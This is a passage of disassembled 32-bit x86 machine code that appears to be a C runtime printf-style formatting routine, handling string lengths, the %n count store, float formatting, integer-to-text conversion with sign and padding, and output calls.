  401da4:	83 c4 04             	add    $0x4,%esp
  401da7:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401daa:	eb 4f                	jmp    0x401dfb
  401dac:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401daf:	81 e1 00 08 00 00    	and    $0x800,%ecx
  401db5:	85 c9                	test   %ecx,%ecx
  401db7:	74 23                	je     0x401ddc
  401db9:	8b 95 b4 fd ff ff    	mov    -0x24c(%ebp),%edx
  401dbf:	8b 42 04             	mov    0x4(%edx),%eax
  401dc2:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401dc5:	8b 8d b4 fd ff ff    	mov    -0x24c(%ebp),%ecx
  401dcb:	0f bf 11             	movswl (%ecx),%edx
  401dce:	d1 ea                	shr    %edx
  401dd0:	89 55 dc             	mov    %edx,-0x24(%ebp)
  401dd3:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  401dda:	eb 1f                	jmp    0x401dfb
  401ddc:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401de3:	8b 85 b4 fd ff ff    	mov    -0x24c(%ebp),%eax
  401de9:	8b 48 04             	mov    0x4(%eax),%ecx
  401dec:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401def:	8b 95 b4 fd ff ff    	mov    -0x24c(%ebp),%edx
  401df5:	0f bf 02             	movswl (%edx),%eax
  401df8:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401dfb:	e9 87 05 00 00       	jmp    0x402387
  401e00:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401e03:	81 e1 30 08 00 00    	and    $0x830,%ecx
  401e09:	85 c9                	test   %ecx,%ecx
  401e0b:	75 09                	jne    0x401e16
  401e0d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401e10:	80 ce 08             	or     $0x8,%dh
  401e13:	89 55 fc             	mov    %edx,-0x4(%ebp)
  401e16:	83 bd cc fd ff ff ff 	cmpl   $0xffffffff,-0x234(%ebp)
  401e1d:	75 0c                	jne    0x401e2b
  401e1f:	c7 85 5c fd ff ff ff 	movl   $0x7fffffff,-0x2a4(%ebp)
  401e26:	ff ff 7f 
  401e29:	eb 0c                	jmp    0x401e37
  401e2b:	8b 85 cc fd ff ff    	mov    -0x234(%ebp),%eax
  401e31:	89 85 5c fd ff ff    	mov    %eax,-0x2a4(%ebp)
  401e37:	8b 8d 5c fd ff ff    	mov    -0x2a4(%ebp),%ecx
  401e3d:	89 8d a8 fd ff ff    	mov    %ecx,-0x258(%ebp)
  401e43:	8d 55 10             	lea    0x10(%ebp),%edx
  401e46:	52                   	push   %edx
  401e47:	e8 44 09 00 00       	call   0x402790
  401e4c:	83 c4 04             	add    $0x4,%esp
  401e4f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401e52:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401e55:	25 10 08 00 00       	and    $0x810,%eax
  401e5a:	85 c0                	test   %eax,%eax
  401e5c:	74 68                	je     0x401ec6
  401e5e:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  401e62:	75 09                	jne    0x401e6d
  401e64:	8b 0d 3c 2a 42 00    	mov    0x422a3c,%ecx
  401e6a:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401e6d:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  401e74:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401e77:	89 95 ac fd ff ff    	mov    %edx,-0x254(%ebp)
  401e7d:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  401e83:	8b 8d a8 fd ff ff    	mov    -0x258(%ebp),%ecx
  401e89:	83 e9 01             	sub    $0x1,%ecx
  401e8c:	89 8d a8 fd ff ff    	mov    %ecx,-0x258(%ebp)
  401e92:	85 c0                	test   %eax,%eax
  401e94:	74 20                	je     0x401eb6
  401e96:	8b 95 ac fd ff ff    	mov    -0x254(%ebp),%edx
  401e9c:	33 c0                	xor    %eax,%eax
  401e9e:	66 8b 02             	mov    (%edx),%ax
  401ea1:	85 c0                	test   %eax,%eax
  401ea3:	74 11                	je     0x401eb6
  401ea5:	8b 8d ac fd ff ff    	mov    -0x254(%ebp),%ecx
  401eab:	83 c1 02             	add    $0x2,%ecx
  401eae:	89 8d ac fd ff ff    	mov    %ecx,-0x254(%ebp)
  401eb4:	eb c7                	jmp    0x401e7d
  401eb6:	8b 95 ac fd ff ff    	mov    -0x254(%ebp),%edx
  401ebc:	2b 55 e0             	sub    -0x20(%ebp),%edx
  401ebf:	d1 fa                	sar    %edx
  401ec1:	89 55 dc             	mov    %edx,-0x24(%ebp)
  401ec4:	eb 5a                	jmp    0x401f20
  401ec6:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  401eca:	75 08                	jne    0x401ed4
  401ecc:	a1 38 2a 42 00       	mov    0x422a38,%eax
  401ed1:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401ed4:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401ed7:	89 8d b0 fd ff ff    	mov    %ecx,-0x250(%ebp)
  401edd:	8b 95 a8 fd ff ff    	mov    -0x258(%ebp),%edx
  401ee3:	8b 85 a8 fd ff ff    	mov    -0x258(%ebp),%eax
  401ee9:	83 e8 01             	sub    $0x1,%eax
  401eec:	89 85 a8 fd ff ff    	mov    %eax,-0x258(%ebp)
  401ef2:	85 d2                	test   %edx,%edx
  401ef4:	74 1e                	je     0x401f14
  401ef6:	8b 8d b0 fd ff ff    	mov    -0x250(%ebp),%ecx
  401efc:	0f be 11             	movsbl (%ecx),%edx
  401eff:	85 d2                	test   %edx,%edx
  401f01:	74 11                	je     0x401f14
  401f03:	8b 85 b0 fd ff ff    	mov    -0x250(%ebp),%eax
  401f09:	83 c0 01             	add    $0x1,%eax
  401f0c:	89 85 b0 fd ff ff    	mov    %eax,-0x250(%ebp)
  401f12:	eb c9                	jmp    0x401edd
  401f14:	8b 8d b0 fd ff ff    	mov    -0x250(%ebp),%ecx
  401f1a:	2b 4d e0             	sub    -0x20(%ebp),%ecx
  401f1d:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  401f20:	e9 62 04 00 00       	jmp    0x402387
  401f25:	8d 55 10             	lea    0x10(%ebp),%edx
  401f28:	52                   	push   %edx
  401f29:	e8 62 08 00 00       	call   0x402790
  401f2e:	83 c4 04             	add    $0x4,%esp
  401f31:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  401f37:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f3a:	83 e0 20             	and    $0x20,%eax
  401f3d:	85 c0                	test   %eax,%eax
  401f3f:	74 12                	je     0x401f53
  401f41:	8b 8d a4 fd ff ff    	mov    -0x25c(%ebp),%ecx
  401f47:	66 8b 95 d4 fd ff ff 	mov    -0x22c(%ebp),%dx
  401f4e:	66 89 11             	mov    %dx,(%ecx)
  401f51:	eb 0e                	jmp    0x401f61
  401f53:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  401f59:	8b 8d d4 fd ff ff    	mov    -0x22c(%ebp),%ecx
  401f5f:	89 08                	mov    %ecx,(%eax)
  401f61:	c7 85 c4 fd ff ff 01 	movl   $0x1,-0x23c(%ebp)
  401f68:	00 00 00 
  401f6b:	e9 17 04 00 00       	jmp    0x402387
  401f70:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  401f77:	8a 55 d8             	mov    -0x28(%ebp),%dl
  401f7a:	80 c2 20             	add    $0x20,%dl
  401f7d:	88 55 d8             	mov    %dl,-0x28(%ebp)
  401f80:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401f83:	0c 40                	or     $0x40,%al
  401f85:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f88:	8d 8d d8 fd ff ff    	lea    -0x228(%ebp),%ecx
  401f8e:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401f91:	83 bd cc fd ff ff 00 	cmpl   $0x0,-0x234(%ebp)
  401f98:	7d 0c                	jge    0x401fa6
  401f9a:	c7 85 cc fd ff ff 06 	movl   $0x6,-0x234(%ebp)
  401fa1:	00 00 00 
  401fa4:	eb 1c                	jmp    0x401fc2
  401fa6:	83 bd cc fd ff ff 00 	cmpl   $0x0,-0x234(%ebp)
  401fad:	75 13                	jne    0x401fc2
  401faf:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  401fb3:	83 fa 67             	cmp    $0x67,%edx
  401fb6:	75 0a                	jne    0x401fc2
  401fb8:	c7 85 cc fd ff ff 01 	movl   $0x1,-0x234(%ebp)
  401fbf:	00 00 00 
  401fc2:	8b 45 10             	mov    0x10(%ebp),%eax
  401fc5:	83 c0 08             	add    $0x8,%eax
  401fc8:	89 45 10             	mov    %eax,0x10(%ebp)
  401fcb:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401fce:	83 e9 08             	sub    $0x8,%ecx
  401fd1:	8b 11                	mov    (%ecx),%edx
  401fd3:	8b 41 04             	mov    0x4(%ecx),%eax
  401fd6:	89 95 9c fd ff ff    	mov    %edx,-0x264(%ebp)
  401fdc:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  401fe2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401fe5:	51                   	push   %ecx
  401fe6:	8b 95 cc fd ff ff    	mov    -0x234(%ebp),%edx
  401fec:	52                   	push   %edx
  401fed:	0f be 45 d8          	movsbl -0x28(%ebp),%eax
  401ff1:	50                   	push   %eax
  401ff2:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401ff5:	51                   	push   %ecx
  401ff6:	8d 95 9c fd ff ff    	lea    -0x264(%ebp),%edx
  401ffc:	52                   	push   %edx
  401ffd:	ff 15 4c 2e 42 00    	call   *0x422e4c
  402003:	83 c4 14             	add    $0x14,%esp
  402006:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402009:	25 80 00 00 00       	and    $0x80,%eax
  40200e:	85 c0                	test   %eax,%eax
  402010:	74 16                	je     0x402028
  402012:	83 bd cc fd ff ff 00 	cmpl   $0x0,-0x234(%ebp)
  402019:	75 0d                	jne    0x402028
  40201b:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40201e:	51                   	push   %ecx
  40201f:	ff 15 58 2e 42 00    	call   *0x422e58
  402025:	83 c4 04             	add    $0x4,%esp
  402028:	0f be 55 d8          	movsbl -0x28(%ebp),%edx
  40202c:	83 fa 67             	cmp    $0x67,%edx
  40202f:	75 19                	jne    0x40204a
  402031:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402034:	25 80 00 00 00       	and    $0x80,%eax
  402039:	85 c0                	test   %eax,%eax
  40203b:	75 0d                	jne    0x40204a
  40203d:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402040:	51                   	push   %ecx
  402041:	ff 15 50 2e 42 00    	call   *0x422e50
  402047:	83 c4 04             	add    $0x4,%esp
  40204a:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40204d:	0f be 02             	movsbl (%edx),%eax
  402050:	83 f8 2d             	cmp    $0x2d,%eax
  402053:	75 12                	jne    0x402067
  402055:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402058:	80 cd 01             	or     $0x1,%ch
  40205b:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40205e:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402061:	83 c2 01             	add    $0x1,%edx
  402064:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402067:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40206a:	50                   	push   %eax
  40206b:	e8 20 15 00 00       	call   0x403590
  402070:	83 c4 04             	add    $0x4,%esp
  402073:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402076:	e9 0c 03 00 00       	jmp    0x402387
  40207b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40207e:	83 c9 40             	or     $0x40,%ecx
  402081:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402084:	c7 85 c8 fd ff ff 0a 	movl   $0xa,-0x238(%ebp)
  40208b:	00 00 00 
  40208e:	e9 82 00 00 00       	jmp    0x402115
  402093:	c7 85 c8 fd ff ff 0a 	movl   $0xa,-0x238(%ebp)
  40209a:	00 00 00 
  40209d:	eb 76                	jmp    0x402115
  40209f:	c7 85 cc fd ff ff 08 	movl   $0x8,-0x234(%ebp)
  4020a6:	00 00 00 
  4020a9:	c7 85 d0 fd ff ff 07 	movl   $0x7,-0x230(%ebp)
  4020b0:	00 00 00 
  4020b3:	eb 0a                	jmp    0x4020bf
  4020b5:	c7 85 d0 fd ff ff 27 	movl   $0x27,-0x230(%ebp)
  4020bc:	00 00 00 
  4020bf:	c7 85 c8 fd ff ff 10 	movl   $0x10,-0x238(%ebp)
  4020c6:	00 00 00 
  4020c9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4020cc:	81 e2 80 00 00 00    	and    $0x80,%edx
  4020d2:	85 d2                	test   %edx,%edx
  4020d4:	74 1d                	je     0x4020f3
  4020d6:	c6 85 c0 fd ff ff 30 	movb   $0x30,-0x240(%ebp)
  4020dd:	8b 85 d0 fd ff ff    	mov    -0x230(%ebp),%eax
  4020e3:	83 c0 51             	add    $0x51,%eax
  4020e6:	88 85 c1 fd ff ff    	mov    %al,-0x23f(%ebp)
  4020ec:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  4020f3:	eb 20                	jmp    0x402115
  4020f5:	c7 85 c8 fd ff ff 08 	movl   $0x8,-0x238(%ebp)
  4020fc:	00 00 00 
  4020ff:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402102:	81 e1 80 00 00 00    	and    $0x80,%ecx
  402108:	85 c9                	test   %ecx,%ecx
  40210a:	74 09                	je     0x402115
  40210c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40210f:	80 ce 02             	or     $0x2,%dh
  402112:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402115:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402118:	25 00 80 00 00       	and    $0x8000,%eax
  40211d:	85 c0                	test   %eax,%eax
  40211f:	74 1d                	je     0x40213e
  402121:	8d 4d 10             	lea    0x10(%ebp),%ecx
  402124:	51                   	push   %ecx
  402125:	e8 86 06 00 00       	call   0x4027b0
  40212a:	83 c4 04             	add    $0x4,%esp
  40212d:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  402133:	89 95 8c fd ff ff    	mov    %edx,-0x274(%ebp)
  402139:	e9 91 00 00 00       	jmp    0x4021cf
  40213e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402141:	83 e2 20             	and    $0x20,%edx
  402144:	85 d2                	test   %edx,%edx
  402146:	74 48                	je     0x402190
  402148:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40214b:	83 e0 40             	and    $0x40,%eax
  40214e:	85 c0                	test   %eax,%eax
  402150:	74 1e                	je     0x402170
  402152:	8d 4d 10             	lea    0x10(%ebp),%ecx
  402155:	51                   	push   %ecx
  402156:	e8 35 06 00 00       	call   0x402790
  40215b:	83 c4 04             	add    $0x4,%esp
  40215e:	0f bf c0             	movswl %ax,%eax
  402161:	99                   	cltd   
  402162:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  402168:	89 95 8c fd ff ff    	mov    %edx,-0x274(%ebp)
  40216e:	eb 1e                	jmp    0x40218e
  402170:	8d 55 10             	lea    0x10(%ebp),%edx
  402173:	52                   	push   %edx
  402174:	e8 17 06 00 00       	call   0x402790
  402179:	83 c4 04             	add    $0x4,%esp
  40217c:	25 ff ff 00 00       	and    $0xffff,%eax
  402181:	99                   	cltd   
  402182:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  402188:	89 95 8c fd ff ff    	mov    %edx,-0x274(%ebp)
  40218e:	eb 3f                	jmp    0x4021cf
  402190:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402193:	83 e0 40             	and    $0x40,%eax
  402196:	85 c0                	test   %eax,%eax
  402198:	74 1b                	je     0x4021b5
  40219a:	8d 4d 10             	lea    0x10(%ebp),%ecx
  40219d:	51                   	push   %ecx
  40219e:	e8 ed 05 00 00       	call   0x402790
  4021a3:	83 c4 04             	add    $0x4,%esp
  4021a6:	99                   	cltd   
  4021a7:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  4021ad:	89 95 8c fd ff ff    	mov    %edx,-0x274(%ebp)
  4021b3:	eb 1a                	jmp    0x4021cf
  4021b5:	8d 55 10             	lea    0x10(%ebp),%edx
  4021b8:	52                   	push   %edx
  4021b9:	e8 d2 05 00 00       	call   0x402790
  4021be:	83 c4 04             	add    $0x4,%esp
  4021c1:	33 c9                	xor    %ecx,%ecx
  4021c3:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  4021c9:	89 8d 8c fd ff ff    	mov    %ecx,-0x274(%ebp)
  4021cf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4021d2:	83 e2 40             	and    $0x40,%edx
  4021d5:	85 d2                	test   %edx,%edx
  4021d7:	74 3e                	je     0x402217
  4021d9:	83 bd 8c fd ff ff 00 	cmpl   $0x0,-0x274(%ebp)
  4021e0:	7f 35                	jg     0x402217
  4021e2:	7c 09                	jl     0x4021ed
  4021e4:	83 bd 88 fd ff ff 00 	cmpl   $0x0,-0x278(%ebp)
  4021eb:	73 2a                	jae    0x402217
  4021ed:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  4021f3:	f7 d8                	neg    %eax
  4021f5:	8b 8d 8c fd ff ff    	mov    -0x274(%ebp),%ecx
  4021fb:	83 d1 00             	adc    $0x0,%ecx
  4021fe:	f7 d9                	neg    %ecx
  402200:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  402206:	89 8d 98 fd ff ff    	mov    %ecx,-0x268(%ebp)
  40220c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40220f:	80 ce 01             	or     $0x1,%dh
  402212:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402215:	eb 18                	jmp    0x40222f
  402217:	8b 85 88 fd ff ff    	mov    -0x278(%ebp),%eax
  40221d:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  402223:	8b 8d 8c fd ff ff    	mov    -0x274(%ebp),%ecx
  402229:	89 8d 98 fd ff ff    	mov    %ecx,-0x268(%ebp)
  40222f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402232:	81 e2 00 80 00 00    	and    $0x8000,%edx
  402238:	85 d2                	test   %edx,%edx
  40223a:	75 1b                	jne    0x402257
  40223c:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  402242:	8b 8d 98 fd ff ff    	mov    -0x268(%ebp),%ecx
  402248:	83 e1 00             	and    $0x0,%ecx
  40224b:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  402251:	89 8d 98 fd ff ff    	mov    %ecx,-0x268(%ebp)
  402257:	83 bd cc fd ff ff 00 	cmpl   $0x0,-0x234(%ebp)
  40225e:	7d 0c                	jge    0x40226c
  402260:	c7 85 cc fd ff ff 01 	movl   $0x1,-0x234(%ebp)
  402267:	00 00 00 
  40226a:	eb 09                	jmp    0x402275
  40226c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40226f:	83 e2 f7             	and    $0xfffffff7,%edx
  402272:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402275:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  40227b:	0b 85 98 fd ff ff    	or     -0x268(%ebp),%eax
  402281:	85 c0                	test   %eax,%eax
  402283:	75 07                	jne    0x40228c
  402285:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40228c:	8d 4d d7             	lea    -0x29(%ebp),%ecx
  40228f:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  402292:	8b 95 cc fd ff ff    	mov    -0x234(%ebp),%edx
  402298:	8b 85 cc fd ff ff    	mov    -0x234(%ebp),%eax
  40229e:	83 e8 01             	sub    $0x1,%eax
  4022a1:	89 85 cc fd ff ff    	mov    %eax,-0x234(%ebp)
  4022a7:	85 d2                	test   %edx,%edx
  4022a9:	7f 14                	jg     0x4022bf
  4022ab:	8b 8d 94 fd ff ff    	mov    -0x26c(%ebp),%ecx
  4022b1:	0b 8d 98 fd ff ff    	or     -0x268(%ebp),%ecx
  4022b7:	85 c9                	test   %ecx,%ecx
  4022b9:	0f 84 81 00 00 00    	je     0x402340
  4022bf:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  4022c5:	99                   	cltd   
  4022c6:	52                   	push   %edx
  4022c7:	50                   	push   %eax
  4022c8:	8b 95 98 fd ff ff    	mov    -0x268(%ebp),%edx
  4022ce:	52                   	push   %edx
  4022cf:	8b 85 94 fd ff ff    	mov    -0x26c(%ebp),%eax
  4022d5:	50                   	push   %eax
  4022d6:	e8 05 4a 00 00       	call   0x406ce0
  4022db:	83 c0 30             	add    $0x30,%eax
  4022de:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  4022e4:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  4022ea:	99                   	cltd   
  4022eb:	52                   	push   %edx
  4022ec:	50                   	push   %eax
  4022ed:	8b 8d 98 fd ff ff    	mov    -0x268(%ebp),%ecx
  4022f3:	51                   	push   %ecx
  4022f4:	8b 95 94 fd ff ff    	mov    -0x26c(%ebp),%edx
  4022fa:	52                   	push   %edx
  4022fb:	e8 70 49 00 00       	call   0x406c70
  402300:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  402306:	89 95 98 fd ff ff    	mov    %edx,-0x268(%ebp)
  40230c:	83 bd 90 fd ff ff 39 	cmpl   $0x39,-0x270(%ebp)
  402313:	7e 12                	jle    0x402327
  402315:	8b 85 90 fd ff ff    	mov    -0x270(%ebp),%eax
  40231b:	03 85 d0 fd ff ff    	add    -0x230(%ebp),%eax
  402321:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  402327:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40232a:	8a 95 90 fd ff ff    	mov    -0x270(%ebp),%dl
  402330:	88 11                	mov    %dl,(%ecx)
  402332:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402335:	83 e8 01             	sub    $0x1,%eax
  402338:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40233b:	e9 52 ff ff ff       	jmp    0x402292
  402340:	8d 4d d7             	lea    -0x29(%ebp),%ecx
  402343:	2b 4d e0             	sub    -0x20(%ebp),%ecx
  402346:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  402349:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40234c:	83 c2 01             	add    $0x1,%edx
  40234f:	89 55 e0             	mov    %edx,-0x20(%ebp)
  402352:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402355:	25 00 02 00 00       	and    $0x200,%eax
  40235a:	85 c0                	test   %eax,%eax
  40235c:	74 29                	je     0x402387
  40235e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402361:	0f be 11             	movsbl (%ecx),%edx
  402364:	83 fa 30             	cmp    $0x30,%edx
  402367:	75 06                	jne    0x40236f
  402369:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  40236d:	75 18                	jne    0x402387
  40236f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402372:	83 e8 01             	sub    $0x1,%eax
  402375:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402378:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40237b:	c6 01 30             	movb   $0x30,(%ecx)
  40237e:	8b 55 dc             	mov    -0x24(%ebp),%edx
  402381:	83 c2 01             	add    $0x1,%edx
  402384:	89 55 dc             	mov    %edx,-0x24(%ebp)
  402387:	83 bd c4 fd ff ff 00 	cmpl   $0x0,-0x23c(%ebp)
  40238e:	0f 85 ce 01 00 00    	jne    0x402562
  402394:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402397:	83 e0 40             	and    $0x40,%eax
  40239a:	85 c0                	test   %eax,%eax
  40239c:	74 4f                	je     0x4023ed
  40239e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4023a1:	81 e1 00 01 00 00    	and    $0x100,%ecx
  4023a7:	85 c9                	test   %ecx,%ecx
  4023a9:	74 10                	je     0x4023bb
  4023ab:	c6 85 c0 fd ff ff 2d 	movb   $0x2d,-0x240(%ebp)
  4023b2:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4023b9:	eb 32                	jmp    0x4023ed
  4023bb:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4023be:	83 e2 01             	and    $0x1,%edx
  4023c1:	85 d2                	test   %edx,%edx
  4023c3:	74 10                	je     0x4023d5
  4023c5:	c6 85 c0 fd ff ff 2b 	movb   $0x2b,-0x240(%ebp)
  4023cc:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4023d3:	eb 18                	jmp    0x4023ed
  4023d5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4023d8:	83 e0 02             	and    $0x2,%eax
  4023db:	85 c0                	test   %eax,%eax
  4023dd:	74 0e                	je     0x4023ed
  4023df:	c6 85 c0 fd ff ff 20 	movb   $0x20,-0x240(%ebp)
  4023e6:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4023ed:	8b 8d bc fd ff ff    	mov    -0x244(%ebp),%ecx
  4023f3:	2b 4d dc             	sub    -0x24(%ebp),%ecx
  4023f6:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  4023f9:	89 8d 84 fd ff ff    	mov    %ecx,-0x27c(%ebp)
  4023ff:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402402:	83 e2 0c             	and    $0xc,%edx
  402405:	85 d2                	test   %edx,%edx
  402407:	75 1c                	jne    0x402425
  402409:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  40240f:	50                   	push   %eax
  402410:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402413:	51                   	push   %ecx
  402414:	8b 95 84 fd ff ff    	mov    -0x27c(%ebp),%edx
  40241a:	52                   	push   %edx
  40241b:	6a 20                	push   $0x20
  40241d:	e8 de 02 00 00       	call   0x402700
  402422:	83 c4 10             	add    $0x10,%esp
  402425:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  40242b:	50                   	push   %eax
  40242c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40242f:	51                   	push   %ecx
  402430:	8b 55 f0             	mov    -0x10(%ebp),%edx
  402433:	52                   	push   %edx
  402434:	8d 85 c0 fd ff ff    	lea    -0x240(%ebp),%eax
  40243a:	50                   	push   %eax
  40243b:	e8 00 03 00 00       	call   0x402740
  402440:	83 c4 10             	add    $0x10,%esp
  402443:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402446:	83 e1 08             	and    $0x8,%ecx
  402449:	85 c9                	test   %ecx,%ecx
  40244b:	74 26                	je     0x402473
  40244d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402450:	83 e2 04             	and    $0x4,%edx
  402453:	85 d2                	test   %edx,%edx
  402455:	75 1c                	jne    0x402473
  402457:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  40245d:	50                   	push   %eax
  40245e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402461:	51                   	push   %ecx
  402462:	8b 95 84 fd ff ff    	mov    -0x27c(%ebp),%edx
  402468:	52                   	push   %edx
  402469:	6a 30                	push   $0x30
  40246b:	e8 90 02 00 00       	call   0x402700
  402470:	83 c4 10             	add    $0x10,%esp
  402473:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402477:	0f 84 a4 00 00 00    	je     0x402521
  40247d:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  402481:	0f 8e 9a 00 00 00    	jle    0x402521
  402487:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40248a:	89 85 80 fd ff ff    	mov    %eax,-0x280(%ebp)
  402490:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402493:	89 8d 7c fd ff ff    	mov    %ecx,-0x284(%ebp)
  402499:	8b 95 7c fd ff ff    	mov    -0x284(%ebp),%edx
  40249f:	8b 85 7c fd ff ff    	mov    -0x284(%ebp),%eax
  4024a5:	83 e8 01             	sub    $0x1,%eax
  4024a8:	89 85 7c fd ff ff    	mov    %eax,-0x284(%ebp)
  4024ae:	85 d2                	test   %edx,%edx
  4024b0:	74 6d                	je     0x40251f
  4024b2:	8b 8d 80 fd ff ff    	mov    -0x280(%ebp),%ecx
  4024b8:	66 8b 11             	mov    (%ecx),%dx
  4024bb:	66 89 95 5a fd ff ff 	mov    %dx,-0x2a6(%ebp)
  4024c2:	66 8b 85 5a fd ff ff 	mov    -0x2a6(%ebp),%ax
  4024c9:	50                   	push   %eax
  4024ca:	8d 8d 78 fd ff ff    	lea    -0x288(%ebp),%ecx
  4024d0:	51                   	push   %ecx
  4024d1:	8b 95 80 fd ff ff    	mov    -0x280(%ebp),%edx
  4024d7:	83 c2 02             	add    $0x2,%edx
  4024da:	89 95 80 fd ff ff    	mov    %edx,-0x280(%ebp)
  4024e0:	e8 eb 46 00 00       	call   0x406bd0
  4024e5:	83 c4 08             	add    $0x8,%esp
  4024e8:	89 85 74 fd ff ff    	mov    %eax,-0x28c(%ebp)
  4024ee:	83 bd 74 fd ff ff 00 	cmpl   $0x0,-0x28c(%ebp)
  4024f5:	7f 02                	jg     0x4024f9
  4024f7:	eb 26                	jmp    0x40251f
  4024f9:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4024ff:	50                   	push   %eax
  402500:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402503:	51                   	push   %ecx
